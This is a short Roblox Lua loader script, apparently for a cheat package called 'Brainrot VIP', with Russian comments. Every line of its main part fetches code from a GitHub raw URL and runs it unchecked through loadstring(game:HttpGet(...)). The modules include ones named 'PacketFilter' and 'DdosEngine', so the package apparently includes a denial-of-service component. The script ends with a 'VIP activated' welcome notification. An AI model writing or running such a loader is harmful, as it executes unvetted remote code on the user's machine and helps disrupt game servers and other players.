-- [[ GLOBAL LOADER - BRAINROT VIP ]]
local base = "https://raw.githubusercontent.com/legendlego000-stack/Brainrot-VIP/main/Modules/"

-- Загрузка всех частей
loadstring(game:HttpGet(base.."Protection.lua"))()
loadstring(game:HttpGet(base.."Optimization.lua"))()
loadstring(game:HttpGet(base.."PacketFilter.lua"))()
loadstring(game:HttpGet(base.."DdosEngine.lua"))()
loadstring(game:HttpGet(base.."Interface.lua"))()

-- Админ-панель (уведомление)
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "VIP АКТИВИРОВАН",
    Text = "Добро пожаловать, legendlego000!",
    Duration = 5
})
